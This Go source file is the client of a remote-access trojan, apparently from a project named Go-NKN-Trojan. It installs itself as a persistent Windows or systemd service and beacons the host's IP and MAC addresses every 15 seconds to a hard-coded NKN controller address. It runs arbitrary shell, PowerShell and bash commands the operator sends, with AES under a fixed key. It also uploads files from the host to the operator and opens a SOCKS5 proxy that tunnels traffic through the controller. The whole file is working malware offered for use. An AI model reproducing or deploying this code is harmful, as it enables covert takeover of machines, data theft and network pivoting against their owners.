//go:build windows || linux

package main

/*
NKN远控客户端主程序
功能：
1. 生成初始seed
2. 定期发送心跳
3. 接收并执行远程命令
4. 上报主机信息
*/

import (
	"Go-NKN-Trojan/Power"
	"context"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/armon/go-socks5"
	"github.com/nknorg/nkn-sdk-go"
	"github.com/shirou/gopsutil/cpu"
)

// 日志类型
const (
	LogTypeHeartbeat = "heartbeat"
	LogTypeError     = "error"
	LogTypeCommand   = "command"
)

func main() {
	controlid := "monitor.bf8c0965e93088c98be3045257c44569390a9f92a500f2a75a1b58db55e6fe72"

	// 注册自启动服务
	exePath, _ := os.Executable()
	serviceName := "NKNClientService"
	if runtime.GOOS == "windows" {
		_ = Power.RegisterService(serviceName, exePath)
	} else {
		_ = registerLinuxService(serviceName, exePath)
	}

	seedstr := InitialSeed()
	Start(seedstr, controlid)
}

func registerLinuxService(serviceName, exePath string) error {
	serviceFile := fmt.Sprintf("/etc/systemd/system/%s.service", serviceName)
	content := fmt.Sprintf(`[Unit]
Description=NKN Trojan Client Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always

[Install]
WantedBy=multi-user.target`, exePath)

	err := os.WriteFile(serviceFile, []byte(content), 0644)
	if err != nil {
		return err
	}

	cmd := exec.Command("systemctl", "enable", serviceName)
	return cmd.Run()
}

func Start(seedstr string, controlid string) {
	seedhex, _ := hex.DecodeString(seedstr)
	account, _ := nkn.NewAccount(seedhex)
	goalip := Power.GetWANIP() + "|" + Power.GetLANIP() + "|" + Power.GetMacAddr()
	Starter, _ := nkn.NewMultiClient(account, seedstr[0:4], 4, false, nknconfig)
	<-Starter.OnConnect.C
	go func() {
		for {
			_, _ = Starter.Send(nkn.NewStringArray(controlid), goalip, nil)
			time.Sleep(15 * time.Second)
		}
	}()
	for {
		msg := <-Starter.OnMessage.C
		decoded := AesDecode(string(msg.Data))
		if decoded == "error" {
			continue
		}
		logToFile(LogTypeHeartbeat, "收到新命令")

		// 增强命令解析鲁棒性
		decoded = strings.TrimSpace(decoded)
		if decoded == "" {
			continue
		}

		// 记录连接提示到日志但不显示
		if strings.Contains(decoded, "客户端") && strings.Contains(decoded, "已连接") {
			logToFile(LogTypeHeartbeat, decoded)
			continue
		}

		// 处理文件传输命令 (原始稳定版本)
		if strings.HasPrefix(decoded, "file ") {
			parts := strings.Fields(decoded)
			if len(parts) != 4 {
				msg.Reply([]byte("文件命令格式错误"))
				continue
			}

			srcPath := parts[2]
			dstPath := parts[3]

			if parts[1] == "upload" {
				data, err := os.ReadFile(srcPath)
				if err != nil {
					msg.Reply([]byte("读取文件失败: " + err.Error()))
					continue
				}

				encrypted, err := Power.AesCbcEncrypt(data, []byte("-=[].!@#$%^&*()_+{}|:<>?"))
				if err != nil {
					msg.Reply([]byte("加密失败: " + err.Error()))
					continue
				}

				_, err = Starter.Send(nkn.NewStringArray(controlid), string(encrypted), nil)
				if err != nil {
					msg.Reply([]byte("发送失败: " + err.Error()))
					continue
				}

				msg.Reply([]byte("文件上传成功"))
			} else if parts[1] == "download" {
				err := handleFileDownload(srcPath, dstPath, Starter, controlid)
				if err != nil {
					msg.Reply([]byte("文件下载失败: " + err.Error()))
				} else {
					msg.Reply([]byte("文件下载成功"))
				}
			}
		} else {
			result := Runcommand(decoded)
			err := msg.Reply(result)
			if err != nil {
				logToFile(LogTypeError, fmt.Sprintf("回复命令结果失败: %v", err))
				return
			}
			logToFile(LogTypeCommand, fmt.Sprintf("执行命令: %s", decoded))
		}
	}
}

func InitialSeed() string {
	infos, _ := cpu.Info()
	var data []uint8
	for _, info := range infos {
		data, _ = json.MarshalIndent(info, "", " ")
	}
	cpumd5 := md5.Sum(data)
	seed := fmt.Sprintf("%x%x", cpumd5, cpumd5)
	return seed
}

func AesDecode(str string) string {
	plaintext, err := Power.AesCbcDecrypt([]byte(str), []byte("-=[].!@#$%^&*()_+{}|:<>?"))
	if err != nil {
		return "error"
	}
	return string(plaintext)
}

func Runcommand(cmd string) []byte {
	var result string
	var err error

	if cmd == "help" {
		result = `可用命令:
1. 文件传输:
   file upload 源路径 目标路径 - 上传本地文件到目标路径
   file download 源路径 目标路径 - 从目标路径下载文件到本地
   示例: 
   file upload /home/user/test.txt /root/test.txt
   file download /root/test.txt /home/user/test.txt

2. SOCKS5代理:
   socks5 端口号 - 启动SOCKS5代理服务
   示例: socks5 1080

3. 系统命令:
   直接输入系统命令执行
   支持cmd、powershell、bash前缀指定shell
   示例: 
   cmd dir
   powershell Get-Process
   bash ls -l

4. 帮助:
   help - 显示本帮助信息`
	} else if strings.HasPrefix(cmd, "file ") {
		parts := strings.Fields(cmd)
		if len(parts) < 4 {
			result = "文件传输命令格式错误，正确格式：file upload|download 源路径 目标路径"
		} else {
			fileCmd := strings.Join(parts[1:], " ")
			err = handleFileCommand(fileCmd, nil, "")
			if err != nil {
				result = "文件传输错误: " + err.Error()
			} else {
				result = "文件传输成功"
			}
		}
	} else if strings.HasPrefix(cmd, "cmd ") {
		command := strings.TrimPrefix(cmd, "cmd ")
		_, result, err = Power.NewCommand().Exec(command)
	} else if strings.HasPrefix(cmd, "powershell ") {
		command := strings.TrimPrefix(cmd, "powershell ")
		_, result, err = Power.NewCommand().Exec("powershell -c \"" + command + "\"")
	} else if strings.HasPrefix(cmd, "bash ") {
		command := strings.TrimPrefix(cmd, "bash ")
		_, result, err = Power.NewCommand().Exec("bash -c \"" + command + "\"")
	} else {
		_, result, err = Power.NewCommand().Exec(cmd)
	}

	if err != nil {
		result = "命令执行错误: " + err.Error()
	}

	encrypted, err := Power.AesCbcEncrypt([]byte(result), []byte("-=[].!@#$%^&*()_+{}|:<>?"))
	if err != nil {
		return []byte("加密错误: " + err.Error())
	}

	return encrypted
}

var nknconfig *nkn.ClientConfig

type fileTransfer struct {
	name     string
	size     int64
	md5      string
	path     string
	received [][]byte
}

var currentTransfer *fileTransfer

func handleFileCommand(cmd string, starter *nkn.MultiClient, controlid string) error {
	parts := strings.Fields(cmd)
	if len(parts) < 1 {
		return fmt.Errorf("invalid file command")
	}

	switch parts[0] {
	case "filemeta":
		if len(parts) != 5 {
			return fmt.Errorf("invalid filemeta command")
		}
		size, err := strconv.ParseInt(parts[2], 10, 64)
		if err != nil {
			return fmt.Errorf("invalid file size")
		}

		currentTransfer = &fileTransfer{
			name:     parts[1],
			size:     size,
			md5:      parts[3],
			path:     parts[4],
			received: make([][]byte, 0),
		}
		return nil

	case "filechunk":
		if len(parts) != 3 {
			return fmt.Errorf("invalid filechunk command")
		}
		if currentTransfer == nil {
			return fmt.Errorf("no active file transfer")
		}

		data, err := hex.DecodeString(parts[2])
		if err != nil {
			return fmt.Errorf("invalid chunk data")
		}

		currentTransfer.received = append(currentTransfer.received, data)
		return nil

	case "filedone":
		if currentTransfer == nil {
			return fmt.Errorf("no active file transfer")
		}

		var fullData []byte
		for _, chunk := range currentTransfer.received {
			fullData = append(fullData, chunk...)
		}

		if int64(len(fullData)) != currentTransfer.size {
			return fmt.Errorf("file size mismatch")
		}

		hash := md5.Sum(fullData)
		actualMD5 := hex.EncodeToString(hash[:])
		if actualMD5 != currentTransfer.md5 {
			return fmt.Errorf("md5 checksum mismatch")
		}

		err := Power.SaveFile(currentTransfer.path, fullData)
		if err != nil {
			return fmt.Errorf("save file error: %v", err)
		}

		currentTransfer = nil
		return nil

	case "filedownload":
		if len(parts) != 3 {
			return fmt.Errorf("invalid filedownload command")
		}
		return handleFileDownload(parts[1], parts[2], starter, controlid)

	case "socks5":
		if len(parts) != 2 {
			return fmt.Errorf("SOCKS5命令格式错误，正确格式：socks5 端口号")
		}
		port := parts[1]
		if _, err := strconv.Atoi(port); err != nil {
			return fmt.Errorf("无效端口号")
		}
		go startSocks5Proxy(port, controlid)
		logToFile(LogTypeHeartbeat, fmt.Sprintf("SOCKS5代理已启动在端口 %s", port))
		return fmt.Errorf("SOCKS5代理已启动在端口 %s\n状态: 运行中\n测试方法：\n1. 设置代理为127.0.0.1:%s\n2. 使用proxychains等工具测试", port, port)

	default:
		return fmt.Errorf("unknown file command")
	}
}

func startSocks5Proxy(port, controlid string) {
	// 增强SOCKS5稳定性
	conf := &socks5.Config{
		Dial: func(ctx context.Context, network, addr string) (net.Conn, error) {
			// 使用持久化连接
			account, err := nkn.NewAccount(nil)
			if err != nil {
				return nil, fmt.Errorf("创建账户失败: %v", err)
			}

			client, err := nkn.NewMultiClient(account, generateRandomID(), 4, true, nknconfig) // 启用重连
			if err != nil {
				return nil, fmt.Errorf("创建客户端失败: %v", err)
			}

			// 增加连接超时和重试机制
			maxRetries := 3
			for i := 0; i < maxRetries; i++ {
				select {
				case <-client.OnConnect.C:
					goto connected
				case <-time.After(5 * time.Second):
					continue
				}
			}
			return nil, fmt.Errorf("连接超时")

		connected:
			host, portStr, err := net.SplitHostPort(addr)
			if err != nil {
				return nil, err
			}

			conn := &ProxyConn{
				client:   client,
				targetID: controlid,
				port:     port,
			}

			data := map[string]interface{}{
				"type": "connect",
				"host": host,
				"port": portStr,
			}
			jsonData, _ := json.Marshal(data)
			encrypted, err := Power.AesCbcEncrypt(jsonData, []byte("-=[].!@#$%^&*()_+{}|:<>?"))
			if err != nil {
				return nil, err
			}

			_, err = client.Send(nkn.NewStringArray(controlid), string(encrypted), nil)
			if err != nil {
				return nil, err
			}

			return conn, nil
		},
	}

	server, err := socks5.New(conf)
	if err != nil {
		logToFile(LogTypeError, fmt.Sprintf("SOCKS5服务启动失败: %v", err))
		return
	}

	addr := fmt.Sprintf("0.0.0.0:%s", port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		logToFile(LogTypeError, fmt.Sprintf("SOCKS5监听失败: %v", err))
		return
	}

	logToFile(LogTypeHeartbeat, fmt.Sprintf("SOCKS5代理已启动, 监听端口: %s", port))
	go server.Serve(listener)
}

type ProxyConn struct {
	client   *nkn.MultiClient
	targetID string
	port     string
	buf      []byte
}

func (c *ProxyConn) Read(b []byte) (n int, err error) {
	if len(c.buf) > 0 {
		n = copy(b, c.buf)
		c.buf = c.buf[n:]
		return n, nil
	}

	msg := <-c.client.OnMessage.C
	var data map[string]interface{}
	err = json.Unmarshal([]byte(AesDecode(string(msg.Data))), &data)
	if err != nil {
		return 0, err
	}

	if data["type"].(string) == "data" {
		decoded, _ := base64.StdEncoding.DecodeString(data["data"].(string))
		n = copy(b, decoded)
		if n < len(decoded) {
			c.buf = decoded[n:]
		}
		return n, nil
	}
	return 0, io.EOF
}

func (c *ProxyConn) Write(b []byte) (n int, err error) {
	data := map[string]interface{}{
		"type": "data",
		"port": c.port,
		"data": base64.StdEncoding.EncodeToString(b),
	}
	jsonData, _ := json.Marshal(data)
	encrypted, err := Power.AesCbcEncrypt(jsonData, []byte("-=[].!@#$%^&*()_+{}|:<>?"))
	if err != nil {
		return 0, err
	}

	_, err = c.client.Send(nkn.NewStringArray(c.targetID), string(encrypted), nil)
	if err != nil {
		return 0, err
	}
	return len(b), nil
}

func (c *ProxyConn) Close() error {
	c.client.Close()
	return nil
}

func (c *ProxyConn) LocalAddr() net.Addr {
	return &net.TCPAddr{IP: net.ParseIP("127.0.0.1"), Port: 0}
}

func (c *ProxyConn) RemoteAddr() net.Addr {
	return &net.TCPAddr{IP: net.ParseIP("127.0.0.1"), Port: 0}
}

func (c *ProxyConn) SetDeadline(t time.Time) error {
	return nil
}

func (c *ProxyConn) SetReadDeadline(t time.Time) error {
	return nil
}

func (c *ProxyConn) SetWriteDeadline(t time.Time) error {
	return nil
}

func handleFileDownload(srcPath, dstPath string, starter *nkn.MultiClient, controlid string) error {
	if _, err := os.Stat(srcPath); os.IsNotExist(err) {
		return fmt.Errorf("file not exist")
	}

	fileData, err := os.ReadFile(srcPath)
	if err != nil {
		return fmt.Errorf("read file error: %v", err)
	}

	encrypted, err := Power.AesCbcEncrypt(fileData, []byte("-=[].!@#$%^&*()_+{}|:<>?"))
	if err != nil {
		return fmt.Errorf("encrypt error: %v", err)
	}

	_, err = starter.Send(nkn.NewStringArray(controlid), string(encrypted), nil)
	if err != nil {
		return fmt.Errorf("send file error: %v", err)
	}

	return nil
}

func logToFile(logType, message string) {
	logDir := "logs"
	if _, err := os.Stat(logDir); os.IsNotExist(err) {
		os.Mkdir(logDir, 0755)
	}

	logFile := fmt.Sprintf("%s/%s-%s.log", logDir, logType, time.Now().Format("2006-01-02"))
	f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println("无法打开日志文件:", err)
		return
	}
	defer f.Close()

	logEntry := fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), message)
	if _, err := f.WriteString(logEntry); err != nil {
		log.Println("写入日志失败:", err)
	}
}

func generateRandomID() string {
	str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	bytes := []byte(str)
	result := []byte{}
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < 32; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	ctx := md5.New()
	ctx.Write(result)
	return hex.EncodeToString(ctx.Sum(nil))
}

func init() {
	nknconfig = &nkn.ClientConfig{
		SeedRPCServerAddr:       nil,
		RPCTimeout:              100000,
		RPCConcurrency:          5,
		MsgChanLen:              409600,
		ConnectRetries:          10,
		MsgCacheExpiration:      300000,
		MsgCacheCleanupInterval: 60000,
		WsHandshakeTimeout:      100000,
		WsWriteTimeout:          100000,
		MinReconnectInterval:    100,
		MaxReconnectInterval:    10000,
		MessageConfig:           nil,
		SessionConfig:           nil,
	}
}
